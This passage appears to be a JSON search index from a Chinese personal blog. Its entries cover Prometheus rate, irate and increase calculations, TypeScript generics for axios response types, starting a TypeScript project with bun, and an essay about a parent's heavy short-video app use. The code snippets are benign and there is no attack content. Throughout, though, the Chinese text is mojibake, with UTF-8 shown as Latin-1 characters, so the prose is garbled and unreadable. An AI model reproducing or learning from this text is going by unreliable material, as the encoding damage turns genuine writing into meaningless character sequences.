è®¡ç®—æ–¹æ¡ˆ (A4-A1) / (B4-B1)ï¼Œ è¿™é‡Œé€‰æ‹©äº†é¦–å°¾ä¸¤ä¸ªå€¼çš„å·®å€¼ï¼Œé™¤ä»¥æ—¶é•¿ç§’ irate è®¡ç®—æ–¹æ¡ˆ (A4-A3) / (B4-B3) , è¿™é‡Œåªé€‰æ‹©é‡Œæœ€åä¸¤ä¸ªç‚¹çš„å·®å€¼ï¼Œé™¤ä»¥æ—¶é•¿ç§’ increase è®¡ç®—æ–¹å¼ (A4-A1) / (B4-B1) * 60, è¿™é‡Œçš„60æ˜¯1m, å…¶å®increaseå°±æ˜¯rate() * windows_secondsçš„è¯­æ³•ç³– guage 296164749 @1710648381.105 296165055 @1710648396.105 296165364 @1710648411.105 296165668 @1710648426.105 296165978 @1710648441.105 296166186 @1710648456.105 296166505 @1710648471.105 296166826 @1710648486.105 296167151 @1710648501.","title":"ä½¿ç”¨Excelç†è§£prometheusçš„å˜åŒ–ç‡ç›¸å…³å‡½æ•°"},{"content":"æˆ‘çŸ¥é“tsæ”¯æŒèŒƒå‹ï¼Œä½†æ˜¯å› ä¸ºå‡ ä¹ç”¨ä¸åˆ°ï¼Œæ‰€ä»¥å¯¹äºèŒƒå‹å¯¹æˆ‘æ¥è¯´å¾€å¾€è’™ä¸Šä¸€å±‚ç¥ç§˜è‰²å½©ã€‚\næœ€è¿‘æˆ‘æ‰çœŸæ­£çš„ä½“ä¼šåˆ°èŒƒå‹çš„çœŸæ­£å¨åŠ›ã€‚\nä¸‹é¢å°±ä»‹ç»æˆ‘çš„ä½¿ç”¨åœºæ™¯ã€‚\nåœ¨å’Œåç«¯æ¥å£äº¤äº’çš„æ—¶å€™ï¼Œ åç«¯æ¥å£è¿”å›çš„æ•°æ®éƒ½æ˜¯å¦‚ä¸‹çš„ç±»å‹ã€‚\ninterface XData { success: boolean total: number result: any[] } è¿™é‡Œæˆ‘æŠŠresultå®šä¹‰ä¸ºanyç±»å‹ï¼Œå› ä¸ºå®ƒçš„å…·ä½“ç±»å‹æ˜¯ç”±æ¥å£ç¡®å®šçš„ã€‚ æ¯”å¦‚æŸ¥è¯å•çš„æ¥å£æ˜¯è¯å•çš„ç»“æ„ç±»å‹ï¼ŒæŸ¥è®¢å•çš„æ¥å£è¿”å›çš„æ˜¯è®¢å•çš„ç±»å‹ã€‚\ninterface CDR { id: number creatAt: string } interface Order { id: number } åœ¨ä¸ç”¨èŒƒå‹çš„æ—¶å€™ï¼Œæˆ‘ä»¬è¦ä¹ˆå®šä¹‰å¦‚ä¸‹ä¸¤ä¸ªinterface\ninterface XDataCDR { success: boolean total: number result: CDR[] } interface XDataOrder { success: boolean total: number result: Order[] } åœ¨ä½¿ç”¨axiosçš„æ—¶å€™ï¼Œå¯¹äºå“åº”ä½“çš„data, å¯ä»¥ä½¿ç”¨å¦‚ä¸‹çš„æ–¹å¼å£°æ˜data\nfunction getCDR (id) { return axios.get\u0026lt;XDataCDR\u0026gt;(\u0026#39;/api/xxx\u0026#39; + id) } ä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬ç¨å¾®ä¿®æ”¹ä¸€ä¸‹XDataçš„ç±»å‹å£°æ˜ï¼ŒåŠ ä¸ŠèŒƒå‹ã€‚ å°±ä¸éœ€è¦ç”¨åˆ°XDataCDRå’ŒXDataOrderä¸¤ä¸ªæ¥å£ã€‚\ninterface XData\u0026lt;T\u0026gt; { success: boolean total: number result: T[] } function getCDR (id) { return axios.get\u0026lt;XData\u0026lt;CDR\u0026gt;\u0026gt;(\u0026#39;/api/xxx\u0026#39; + id) } åªéœ€è¦ç”¨åˆ°XData\u0026lt;CDR\u0026gt;å°±å¯ä»¥æ„é€ å‡ºæ–°çš„ç±»å‹ã€‚\nä»ä¸Šé¢å¯ä»¥çœ‹å‡ºèŒƒå‹å®é™…ä¸Šä¸æ˜¯çº¦æŸå…·ä½“çš„å€¼çš„ï¼Œè€Œæ˜¯ç”¨æ¥å¯¹ç±»å‹è¿›è¡Œçº¦æŸã€‚ä½¿ç”¨èŒƒå‹ï¼Œå¯ä»¥å‡å°‘å¤§é‡é‡å¤çš„ä»£ç ã€‚\nèŒƒå‹ä¸€èˆ¬ç”¨äºå…³é”®è¯ä¹‹åï¼Œä¾‹å¦‚interfaceåä¹‹åï¼Œå‡½æ•°åä¹‹åã€‚\nä¾‹å¦‚ï¼š\ninterface X\u0026lt;T\u0026gt; { a: T } function say\u0026lt;T\u0026gt;() : T[] { } æ‰€ä»¥ï¼Œæœ‰äº›åŠŸèƒ½ï¼Œç›´åˆ°çœŸæ­£ç”¨åˆ°ï¼Œæ‰èƒ½çœŸæ­£ç†è§£ã€‚\n","permalink":"https://wdd.js.org/posts/2023/when-to-use-ts-generics/","summary":"æˆ‘çŸ¥é“tsæ”¯æŒèŒƒå‹ï¼Œä½†æ˜¯å› ä¸ºå‡ ä¹ç”¨ä¸åˆ°ï¼Œæ‰€ä»¥å¯¹äºèŒƒå‹å¯¹æˆ‘æ¥è¯´å¾€å¾€è’™ä¸Šä¸€å±‚ç¥ç§˜è‰²å½©ã€‚\næœ€è¿‘æˆ‘æ‰çœŸæ­£çš„ä½“ä¼šåˆ°èŒƒå‹çš„çœŸæ­£å¨åŠ›ã€‚\nä¸‹é¢å°±ä»‹ç»æˆ‘çš„ä½¿ç”¨åœºæ™¯ã€‚\nåœ¨å’Œåç«¯æ¥å£äº¤äº’çš„æ—¶å€™ï¼Œ åç«¯æ¥å£è¿”å›çš„æ•°æ®éƒ½æ˜¯å¦‚ä¸‹çš„ç±»å‹ã€‚\ninterface XData { success: boolean total: number result: any[] } è¿™é‡Œæˆ‘æŠŠresultå®šä¹‰ä¸ºanyç±»å‹ï¼Œå› ä¸ºå®ƒçš„å…·ä½“ç±»å‹æ˜¯ç”±æ¥å£ç¡®å®šçš„ã€‚ æ¯”å¦‚æŸ¥è¯å•çš„æ¥å£æ˜¯è¯å•çš„ç»“æ„ç±»å‹ï¼ŒæŸ¥è®¢å•çš„æ¥å£è¿”å›çš„æ˜¯è®¢å•çš„ç±»å‹ã€‚\ninterface CDR { id: number creatAt: string } interface Order { id: number } åœ¨ä¸ç”¨èŒƒå‹çš„æ—¶å€™ï¼Œæˆ‘ä»¬è¦ä¹ˆå®šä¹‰å¦‚ä¸‹ä¸¤ä¸ªinterface\ninterface XDataCDR { success: boolean total: number result: CDR[] } interface XDataOrder { success: boolean total: number result: Order[] } åœ¨ä½¿ç”¨axiosçš„æ—¶å€™ï¼Œå¯¹äºå“åº”ä½“çš„data, å¯ä»¥ä½¿ç”¨å¦‚ä¸‹çš„æ–¹å¼å£°æ˜data\nfunction getCDR (id) { return axios.get\u0026lt;XDataCDR\u0026gt;(\u0026#39;/api/xxx\u0026#39; + id) } ä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬ç¨å¾®ä¿®æ”¹ä¸€ä¸‹XDataçš„ç±»å‹å£°æ˜ï¼ŒåŠ ä¸ŠèŒƒå‹ã€‚ å°±ä¸éœ€è¦ç”¨åˆ°XDataCDRå’ŒXDataOrderä¸¤ä¸ªæ¥å£ã€‚\ninterface XData\u0026lt;T\u0026gt; { success: boolean total: number result: T[] } function getCDR (id) { return axios.","title":"ä»€ä¹ˆæ—¶å€™åº”è¯¥ä½¿ç”¨tsèŒƒå‹?"},{"content":"å‰è¨€ æœ€è¿‘æˆ‘åœ¨å¼€å‘ä¸€ä¸ªdemoç¨‹åºï¼Œä¸ºäº†åŠ é€Ÿå¼€å‘ï¼Œæˆ‘è§‰å¾—ç›´æ¥ç”¨jsè¦æ¯”ç”¨typescriptæ›´å¿«ï¼Œè€Œä¸”è¿™åªæ˜¯ä¸€ä¸ªdemoç¨‹åºï¼Œæ€é¸¡ç„‰ç”¨ç‰›åˆ€ã€‚\nè€Œä¸”ä¸€æ—¦æˆ‘è¦ç”¨typescriptå¼€å‘ï¼Œé¿å…ä¸äº†è¦å„ç§é…ç½®ï¼Œä¾‹å¦‚typescript, ts-node, nodemonä¹‹ç±»çš„ï¼Œå¾ˆæ˜¯ç¹çã€‚è€Œä¸”tsä¹Ÿå¿…é¡»è¦ç»è¿‡ç¼–è¯‘åæ‰èƒ½è¿è¡Œã€‚\nç„¶è€Œï¼Œç›´åˆ°é‡åˆ°ä¸€ä¸ªbug, æˆ‘æ’æŸ¥äº†åŠå¤©ï¼Œæ‰å‘ç°æ˜¯ä¸€ä¸ªå¯¹è±¡çš„å±æ€§å†™é”™äº†ã€‚æœ¬èº«è¿™ä¸ªå¯¹è±¡æ˜¯æ²¡æœ‰è¿™ä¸ªå±æ€§çš„ï¼Œjsæ²¡æœ‰ä»»ä½•é”™è¯¯æç¤ºã€‚æˆ‘åªèƒ½ä¸€æ­¥ä¸€æ­¥ç¼©å°ä»£ç çš„èŒƒå›´ï¼Œæœ€ç»ˆæ‰å®šä½åˆ°æ˜¯å±æ€§æ‹¼å†™çš„é”™è¯¯ã€‚\nè¿™ä¸ªæ‹¼å†™çš„é”™è¯¯ï¼Œåº”è¯¥æ˜¯vscodeçš„æ™ºèƒ½è¡¥å…¨ï¼Œç»™å‡ºçš„æç¤ºè¯ï¼Œæˆ‘ç›´æ¥å›è½¦ç¡®è®¤äº†ã€‚\nè¿™ä»¶äº‹ç»™æˆ‘ä¸€ä¸ªæ•™è®­ï¼šä»¥åæ‰€æœ‰ä»£ç éƒ½è¦ç”¨tså»ç¼–å†™ã€‚\nç›´æ¥ç”¨jså»ç¼–å†™è™½ç„¶çœ‹èµ·æ¥å†™çš„å¿«ï¼Œä½†æ˜¯ä»£ç è°ƒè¯•å¤ªç—›è‹¦äº†ã€‚ è¿™ç§æ‹¼å†™é”™è¯¯ï¼Œtsçš„æ™ºèƒ½æç¤ºä¼šç›´æ¥å‘Šè¯‰ä½ é”™è¯¯çš„åœ°æ–¹ï¼Œä½†æ˜¯å¦‚æœå»æ’æŸ¥jsæ–‡ä»¶ï¼ŒèŠ±è´¹çš„æ—¶é—´æ˜¯æ— æ³•ä¼°é‡çš„ã€‚\nä½†æ˜¯æˆ‘åˆä¸å¤ªæƒ³å»é…ç½®å„ç§tsçš„æ‰§è¡Œç¯å¢ƒï¼Œå°±æƒ³èµ·æ¥ä¹‹å‰æ›¾ç»ç”¨çš„bunè¿™ä¸ªtsæ‰§è¡Œå·¥å…·ã€‚\nè™½ç„¶bunè¿™ä¸ªå·¥å…·æ‰åˆšåˆšå‘å¸ƒ1.0ç‰ˆæœ¬ï¼Œä½†æ˜¯åœ¨å¼€å‘ç¯å¢ƒä½¿ç”¨ä¹Ÿæ˜¯è¶³å¤Ÿäº†ã€‚\næˆ‘çš„è®¾æƒ³æ˜¯åœ¨å¼€å‘ç¯å¢ƒç”¨bun, åœ¨ç”Ÿäº§ç¯å¢ƒç”¨nodejsæ‰§è¡Œbunç¼–è¯‘åçš„jsä»£ç ã€‚\nè¿™ä¸ªdemoç¨‹åºç”¨bunå»è¿è¡Œçš„æ—¶å€™ï¼Œæ²¡å‘ç°ä»»ä½•å…¼å®¹é—®é¢˜ã€‚ è¿™ä¹Ÿè®©æˆ‘æœ‰äº†ç»§ç»­ç ”ç©¶ä¸‹å»çš„ä¿¡å¿ƒã€‚\nbunçš„å¼€å‘ç¯å¢ƒ æˆ‘ä¹‹å‰çœ‹è¿‡deno, ä½†æ˜¯çœ‹å¤šdenoçš„å®˜æ–¹æ–‡æ¡£åï¼Œå‘ç°å¹¶ä¸ç¬¦åˆæˆ‘çš„èƒƒå£ã€‚ ä½†æ˜¯bunçš„æ–‡æ¡£å†™çš„å¾ˆå¥½ã€‚\nä»»ä½•å·¥å…·çš„ç¬¬ä¸€æ­¥éƒ½æ˜¯å®‰è£…ï¼Œä½†æ˜¯bunä¼¼ä¹åœ¨windowsä¸Šæ‰§è¡Œå¹¶ä¸å¤ªå¥½ï¼Œæ‰€ä»¥æˆ‘æ˜¯ç”¨windowsçš„linuxå­ç³»ç»Ÿï¼Œæˆ–è€…åœ¨macä¸Šå®‰è£…çš„bunã€‚\nå…·ä½“çš„å®‰è£…æ­¥éª¤å¯ä»¥å‚è€ƒï¼Œhttps://bun.sh/docs/installation\né¡¹ç›®åˆå§‹åŒ– bun init bun init helps you get started with a minimal project and tries to guess sensible defaults. Press ^C anytime to quit. package name (quickstart): entry point (index.ts): Done! A package.json file was saved in the current directory. + index.ts + .gitignore + tsconfig.json (for editor auto-complete) + README.md To get started, run: bun run index.ts ä½¿ç”¨bunè¿è¡Œindex.ts\nbun run index.ts Hello via Bun! å®‰è£…npmåŒ…\nbun add figlet bun add -d @types/figlet ä¿®æ”¹index.ts\nimport figlet from \u0026#34;figlet\u0026#34;; const body = figlet.textSync(\u0026#34;Bun!\u0026#34;); console.log(body); æ‰§è¡Œindex.ts, è¾“å‡º\n____ _ | __ ) _ _ _ __ | | | _ \\| | | | \u0026#39;_ \\| | | |_) | |_| | | | |_| |____/ \\__,_|_| |_(_) ç„¶åæˆ‘ä»¬å°è¯•æŠŠindex.tsç¼–è¯‘jsæ–‡ä»¶ã€‚\nç¼–å†™ä¸€ä¸ªbuild.tsç¼–è¯‘æ–‡ä»¶\nå‚è€ƒèµ„æ–™ https://bun.sh/docs/bundler ","permalink":"https://wdd.js.org/posts/2023/typescript-with-bun/","summary":"å‰è¨€ æœ€è¿‘æˆ‘åœ¨å¼€å‘ä¸€ä¸ªdemoç¨‹åºï¼Œä¸ºäº†åŠ é€Ÿå¼€å‘ï¼Œæˆ‘è§‰å¾—ç›´æ¥ç”¨jsè¦æ¯”ç”¨typescriptæ›´å¿«ï¼Œè€Œä¸”è¿™åªæ˜¯ä¸€ä¸ªdemoç¨‹åºï¼Œæ€é¸¡ç„‰ç”¨ç‰›åˆ€ã€‚\nè€Œä¸”ä¸€æ—¦æˆ‘è¦ç”¨typescriptå¼€å‘ï¼Œé¿å…ä¸äº†è¦å„ç§é…ç½®ï¼Œä¾‹å¦‚typescript, ts-node, nodemonä¹‹ç±»çš„ï¼Œå¾ˆæ˜¯ç¹çã€‚è€Œä¸”tsä¹Ÿå¿…é¡»è¦ç»è¿‡ç¼–è¯‘åæ‰èƒ½è¿è¡Œã€‚\nç„¶è€Œï¼Œç›´åˆ°é‡åˆ°ä¸€ä¸ªbug, æˆ‘æ’æŸ¥äº†åŠå¤©ï¼Œæ‰å‘ç°æ˜¯ä¸€ä¸ªå¯¹è±¡çš„å±æ€§å†™é”™äº†ã€‚æœ¬èº«è¿™ä¸ªå¯¹è±¡æ˜¯æ²¡æœ‰è¿™ä¸ªå±æ€§çš„ï¼Œjsæ²¡æœ‰ä»»ä½•é”™è¯¯æç¤ºã€‚æˆ‘åªèƒ½ä¸€æ­¥ä¸€æ­¥ç¼©å°ä»£ç çš„èŒƒå›´ï¼Œæœ€ç»ˆæ‰å®šä½åˆ°æ˜¯å±æ€§æ‹¼å†™çš„é”™è¯¯ã€‚\nè¿™ä¸ªæ‹¼å†™çš„é”™è¯¯ï¼Œåº”è¯¥æ˜¯vscodeçš„æ™ºèƒ½è¡¥å…¨ï¼Œç»™å‡ºçš„æç¤ºè¯ï¼Œæˆ‘ç›´æ¥å›è½¦ç¡®è®¤äº†ã€‚\nè¿™ä»¶äº‹ç»™æˆ‘ä¸€ä¸ªæ•™è®­ï¼šä»¥åæ‰€æœ‰ä»£ç éƒ½è¦ç”¨tså»ç¼–å†™ã€‚\nç›´æ¥ç”¨jså»ç¼–å†™è™½ç„¶çœ‹èµ·æ¥å†™çš„å¿«ï¼Œä½†æ˜¯ä»£ç è°ƒè¯•å¤ªç—›è‹¦äº†ã€‚ è¿™ç§æ‹¼å†™é”™è¯¯ï¼Œtsçš„æ™ºèƒ½æç¤ºä¼šç›´æ¥å‘Šè¯‰ä½ é”™è¯¯çš„åœ°æ–¹ï¼Œä½†æ˜¯å¦‚æœå»æ’æŸ¥jsæ–‡ä»¶ï¼ŒèŠ±è´¹çš„æ—¶é—´æ˜¯æ— æ³•ä¼°é‡çš„ã€‚\nä½†æ˜¯æˆ‘åˆä¸å¤ªæƒ³å»é…ç½®å„ç§tsçš„æ‰§è¡Œç¯å¢ƒï¼Œå°±æƒ³èµ·æ¥ä¹‹å‰æ›¾ç»ç”¨çš„bunè¿™ä¸ªtsæ‰§è¡Œå·¥å…·ã€‚\nè™½ç„¶bunè¿™ä¸ªå·¥å…·æ‰åˆšåˆšå‘å¸ƒ1.0ç‰ˆæœ¬ï¼Œä½†æ˜¯åœ¨å¼€å‘ç¯å¢ƒä½¿ç”¨ä¹Ÿæ˜¯è¶³å¤Ÿäº†ã€‚\næˆ‘çš„è®¾æƒ³æ˜¯åœ¨å¼€å‘ç¯å¢ƒç”¨bun, åœ¨ç”Ÿäº§ç¯å¢ƒç”¨nodejsæ‰§è¡Œbunç¼–è¯‘åçš„jsä»£ç ã€‚\nè¿™ä¸ªdemoç¨‹åºç”¨bunå»è¿è¡Œçš„æ—¶å€™ï¼Œæ²¡å‘ç°ä»»ä½•å…¼å®¹é—®é¢˜ã€‚ è¿™ä¹Ÿè®©æˆ‘æœ‰äº†ç»§ç»­ç ”ç©¶ä¸‹å»çš„ä¿¡å¿ƒã€‚\nbunçš„å¼€å‘ç¯å¢ƒ æˆ‘ä¹‹å‰çœ‹è¿‡deno, ä½†æ˜¯çœ‹å¤šdenoçš„å®˜æ–¹æ–‡æ¡£åï¼Œå‘ç°å¹¶ä¸ç¬¦åˆæˆ‘çš„èƒƒå£ã€‚ ä½†æ˜¯bunçš„æ–‡æ¡£å†™çš„å¾ˆå¥½ã€‚\nä»»ä½•å·¥å…·çš„ç¬¬ä¸€æ­¥éƒ½æ˜¯å®‰è£…ï¼Œä½†æ˜¯bunä¼¼ä¹åœ¨windowsä¸Šæ‰§è¡Œå¹¶ä¸å¤ªå¥½ï¼Œæ‰€ä»¥æˆ‘æ˜¯ç”¨windowsçš„linuxå­ç³»ç»Ÿï¼Œæˆ–è€…åœ¨macä¸Šå®‰è£…çš„bunã€‚\nå…·ä½“çš„å®‰è£…æ­¥éª¤å¯ä»¥å‚è€ƒï¼Œhttps://bun.sh/docs/installation\né¡¹ç›®åˆå§‹åŒ– bun init bun init helps you get started with a minimal project and tries to guess sensible defaults. Press ^C anytime to quit. package name (quickstart): entry point (index.ts): Done! A package.json file was saved in the current directory. + index.ts + .gitignore + tsconfig.json (for editor auto-complete) + README.","title":"ä½¿ç”¨bunåŠ é€Ÿå¼€å‘ç¯å¢ƒçš„tsç¼–å†™"},{"content":"æˆ‘ä»¥å‰çœ‹è¿‡ä¸€éƒ¨ç”µå½±ï¼Œå«åšã€Šå…¥ä¾µè„‘ç»†èƒã€‹ï¼Œè¿™éƒ¨ç”µå½±æä¾›ä¸€ç§å¯èƒ½æ€§ã€‚ç±»ä¼¼çš„ç”µå½±è¿˜æœ‰ã€Šç›—æ¢¦ç©ºé—´ã€‹ï¼Œéƒ½æ˜¯å°†ä¸€ç§æ€æƒ³æ¤å…¥åˆ«äººçš„æ€æƒ³ä¸­ã€‚\nè¿™ä¸¤éƒ¨ç”µå½±è™½ç„¶æä¾›äº†å¯èƒ½æ€§ï¼Œä½†æ˜¯å´æ— æ³•æä¾›å®é™…å¯æ“ä½œçš„æ–¹æ¡ˆã€‚\næœ€è¿‘åœ¨é˜…è¯»çš„ä¸€æœ¬ä¹¦ä¹Ÿäºæ­¤æœ‰å…³ï¼Œå«åšã€Šå¯¹ä¸èµ·ï¼Œæˆ‘æ“æ§äº†ä½ çš„å¤§è„‘ã€‹ï¼Œæ˜¯ä¸€ä¸ªå«åšå‰‘æ¡¥åˆ†æã€æ›¾è½°åŠ¨ä¸–ç•Œçš„å…¬å¸ï¼Œåˆ©ç”¨åŸºäºå¤§æ•°æ®ã€ç®—æ³•ã€äººå·¥æ™ºèƒ½ã€å¿ƒç†å­¦æ¥åšæ€æƒ³æ¤å…¥çš„ã€‚å¸¸è§çš„é¢†åŸŸå¦‚æ“çºµå¤§é€‰ï¼Œå¹¶ä¸”æä¾›æˆåŠŸçš„æ¡ˆä¾‹ã€‚\nä½†æ˜¯ä½œä¸ºæ™®é€šäººï¼Œå¤§è§„æ¨¡çš„æ€æƒ³æ¤å…¥ä¼¼ä¹é‡Œæˆ‘ä»¬è¿˜æ˜¯æ¯”è¾ƒé¥è¿œã€‚\nä½†æ˜¯çœŸçš„é‚£ä¹ˆé¥è¿œå—ï¼Ÿ\næ˜¨å¤©æˆ‘çˆ¸æ¥çœ‹æˆ‘ï¼Œä¹‹å‰ä»–æ€»æ˜¯æŠ±æ€¨æ‰‹æœºæµé‡ä¸å¤Ÿç”¨ã€‚æˆ‘ç»™ä»–æ¢äº†æ¯ä¸ªæœˆ180Gçš„æµé‡å¡ï¼Œæ‰è¿‡æ²¡ä¸¤ä¸‰å¤©ï¼Œä»–è¯´å·²ç»ç”¨äº†20å¤šGäº†ã€‚æŒ‰ç…§è¿™ä¸ªé€Ÿåº¦ï¼Œ180Gçš„æµé‡ä¹Ÿä¸å¤Ÿç”¨ä¸€ä¸ªæœˆã€‚\næˆ‘é—®ï¼šâ€œä½ æ€ä¹ˆä¼šç”¨é‚£ä¹ˆå¤šæµé‡ï¼ï¼Œä½ ç”¨æ‰‹æœºçœ‹è§†é¢‘çš„å—ï¼Ÿâ€\nçˆ¸è¯´ï¼šâ€œæˆ‘ç»å¸¸åˆ·æŠ–éŸ³ï¼Œåˆ·å¥½ä¹…ï¼Œåˆ·çš„çœ¼ç–¼â€\næˆ‘è¯´ï¼šâ€œä½ è¿˜æ˜¯å°‘åˆ·ç‚¹æ‰‹æœºå§â€ï¼Œè™½ç„¶è¿™åªæ˜¯è‹ç™½æ— åŠ›çš„ ä¸€å¥å…³å¿ƒã€‚\næˆ‘çˆ¸ç”Ÿäº70å¹´ä»£ï¼Œæ²¡æ€ä¹ˆè¯»è¿‡ä¹¦ï¼Œå°å­¦æ–‡å‡­ã€‚ç°åœ¨å¹´è¿‘äº”åï¼Œç»å¸¸å¸¦ç€é¸­èˆŒå¸½ï¼Œä¾ç„¶é®ä¸ä½åè„‘å‹ºæ–‘ç™½çš„å¤´å‘ã€‚è™½ç„¶ä»–ç»å¸¸ç”¨æ‰‹æœºï¼Œä½†æ˜¯å¾ˆå¤šä¸œè¥¿ä¾ç„¶æä¸æ˜ç™½ï¼Œéœ€è¦æ‰¾èº«è¾¹çš„å¹´è½»äººæ¥å¸®å¿™è®¾ç½®æ‰‹æœºã€‚\nä¸€ä¸ª50å¤šå²çš„äººï¼Œäººç”Ÿè¿‡äº†å¤§åŠã€‚é¢å¯¹ç°åœ¨é£é€Ÿå‘å±•çš„ç¤¾ä¼šï¼Œå¾ˆå¤šä¸œè¥¿éƒ½å·²ç»æ— æ³•é€‚åº”ã€‚å¯¹äºä»–è‡ªå·±æ¥è¯´ï¼Œä¹ŸåŸºæœ¬ä¸Šæ— æ³•æ”¹å˜è‡ªå·±ã€‚ä»ç¬¬ä¸ƒæ¬¡äººå£æ™®æŸ¥çš„æ•°æ®ä¸­å¯ä»¥çœ‹å‡ºï¼Œåœ¨2020å¹´60+çš„äººå£å·²ç»å æ¯”æ¥è¿‘14äº¿äººå£çš„20%äº†ï¼Œéšç€æ—¶é—´çš„æ¨ç§»ï¼Œè¿™ä¸ªå æ¯”åªä¼šå¢å¤§ã€‚\nå¯¹äºæˆ‘çˆ¸è¿™ç±»çš„äººï¼Œå³ä½¿åˆ·çš„çœ¼ç›ç–¼ï¼Œä¹Ÿæ— æ³•æ§åˆ¶è‡ªå·±ï¼Œè¿˜æ˜¯ä¸€ç›´ä¸åœçš„åˆ·ã€‚\nç”±æ­¤å¯è§ï¼Œåƒè¿™ç§å¤§å…¬å¸ï¼Œåˆ¶ä½œçš„è¶…çº§Appæœ‰å¤šå¯æ€•ã€‚èƒ½å¤Ÿä¸€ç›´æŒç»­çš„è®©å¤§è„‘ä¿æŒçŸ­æœŸå…´å¥‹ã€‚è¿™ç§è¶…çº§Appï¼ŒèƒŒåéƒ½æ˜¯å¿ƒç†å­¦å®¶ã€è®¡ç®—æœºå­¦å®¶ã€æ•°æ®ç§‘å­¦å®¶ç­‰ã€‚ è¿™äº›ä¸“å®¶å¯¹å¾…æ™®é€šå¤§ä¼—ï¼Œå°±åƒå“¥ä¼¦å¸ƒå¯¹å¾…å°ç¬¬å®‰äººã€‚\nå› ä¸ºæˆ‘å‘ç°ä»–ä»¬æ²¡æœ‰ä»€ä¹ˆä¿¡ä»°ï¼Œä¹Ÿæ²¡æœ‰ä»»ä½•å´‡æ‹œçš„å½¢è±¡ï¼Œäººä»¬åˆéƒ½å¾ˆæ¸©å’Œï¼Œä»–ä»¬æ— é‚ªå¾—ä¸çŸ¥é“ä»€ä¹ˆæ˜¯é‚ªæ¶ï¼Œä»ä¸ä¾µå®³åˆ«äººï¼Œä¹Ÿä¸æ‡‚å¾—å·çªƒï¼Œæ²¡æœ‰æ‰“æ–—ï¼Œç‰¹åˆ«çš„æ¸©é¡º ã€Šå“¥ä¼¦å¸ƒæ—¥è®°ã€‹\næˆ–è®¸å‡ åå¹´ä»¥åï¼Œå¤§éƒ¨åˆ†äººçš„å¤§è„‘å·²ç»é€€åŒ–ï¼Œä¹Ÿä¸éœ€è¦æœ‰æ€è€ƒèƒ½é‡Œã€‚åªéœ€è¦æœºæ¢°çš„æŒ‰ç…§åˆºæ¿€-\u0026gt;ååº”å»è¡ŒåŠ¨ã€‚\nè¿™ç§è¿›åŒ–æ˜¯ä¸€ç§æ½®æµï¼Œç»å¤§å¤šæ•°äººéƒ½éš¾ä»¥å¹¸å…ã€‚ä½œä¸ºä¸€ä¸ªç‹¬ç«‹æ€è€ƒçš„äººï¼Œæˆ‘åªèƒ½å°½é‡é¿å…è¢«å½±å“ï¼Œè¿œç¦»ç¤¾äº¤ç½‘ç»œã€‚\n","permalink":"https://wdd.js.org/posts/2023/the-cell/","summary":"æˆ‘ä»¥å‰çœ‹è¿‡ä¸€éƒ¨ç”µå½±ï¼Œå«åšã€Šå…¥ä¾µè„‘ç»†èƒã€‹ï¼Œè¿™éƒ¨ç”µå½±æä¾›ä¸€ç§å¯èƒ½æ€§ã€‚ç±»ä¼¼çš„ç”µå½±è¿˜æœ‰ã€Šç›—æ¢¦ç©ºé—´ã€‹ï¼Œéƒ½æ˜¯å°†ä¸€ç§æ€æƒ³æ¤å…¥åˆ«äººçš„æ€æƒ³ä¸­ã€‚\nè¿™ä¸¤éƒ¨ç”µå½±è™½ç„¶æä¾›äº†å¯èƒ½æ€§ï¼Œä½†æ˜¯å´æ— æ³•æä¾›å®é™…å¯æ“ä½œçš„æ–¹æ¡ˆã€‚\næœ€è¿‘åœ¨é˜…è¯»çš„ä¸€æœ¬ä¹¦ä¹Ÿäºæ­¤æœ‰å…³ï¼Œå«åšã€Šå¯¹ä¸èµ·ï¼Œæˆ‘æ“æ§äº†ä½ çš„å¤§è„‘ã€‹ï¼Œæ˜¯ä¸€ä¸ªå«åšå‰‘æ¡¥åˆ†æã€æ›¾è½°åŠ¨ä¸–ç•Œçš„å…¬å¸ï¼Œåˆ©ç”¨åŸºäºå¤§æ•°æ®ã€ç®—æ³•ã€äººå·¥æ™ºèƒ½ã€å¿ƒç†å­¦æ¥åšæ€æƒ³æ¤å…¥çš„ã€‚å¸¸è§çš„é¢†åŸŸå¦‚æ“çºµå¤§é€‰ï¼Œå¹¶ä¸”æä¾›æˆåŠŸçš„æ¡ˆä¾‹ã€‚\nä½†æ˜¯ä½œä¸ºæ™®é€šäººï¼Œå¤§è§„æ¨¡çš„æ€æƒ³æ¤å…¥ä¼¼ä¹é‡Œæˆ‘ä»¬è¿˜æ˜¯æ¯”è¾ƒé¥è¿œã€‚\nä½†æ˜¯çœŸçš„é‚£ä¹ˆé¥è¿œå—ï¼Ÿ\næ˜¨å¤©æˆ‘çˆ¸æ¥çœ‹æˆ‘ï¼Œä¹‹å‰ä»–æ€»æ˜¯æŠ±æ€¨æ‰‹æœºæµé‡ä¸å¤Ÿç”¨ã€‚æˆ‘ç»™ä»–æ¢äº†æ¯ä¸ªæœˆ180Gçš„æµé‡å¡ï¼Œæ‰è¿‡æ²¡ä¸¤ä¸‰å¤©ï¼Œä»–è¯´å·²ç»ç”¨äº†20å¤šGäº†ã€‚æŒ‰ç…§è¿™ä¸ªé€Ÿåº¦ï¼Œ180Gçš„æµé‡ä¹Ÿä¸å¤Ÿç”¨ä¸€ä¸ªæœˆã€‚\næˆ‘é—®ï¼šâ€œä½ æ€ä¹ˆä¼šç”¨é‚£ä¹ˆå¤šæµé‡ï¼ï¼Œä½ ç”¨æ‰‹æœºçœ‹è§†é¢‘çš„å—ï¼Ÿâ€\nçˆ¸è¯´ï¼šâ€œæˆ‘ç»å¸¸åˆ·æŠ–éŸ³ï¼Œåˆ·å¥½ä¹…ï¼Œåˆ·çš„çœ¼ç–¼â€\næˆ‘è¯´ï¼šâ€œä½ è¿˜æ˜¯å°‘åˆ·ç‚¹æ‰‹æœºå§â€ï¼Œè™½ç„¶è¿™åªæ˜¯è‹ç™½æ— åŠ›çš„ 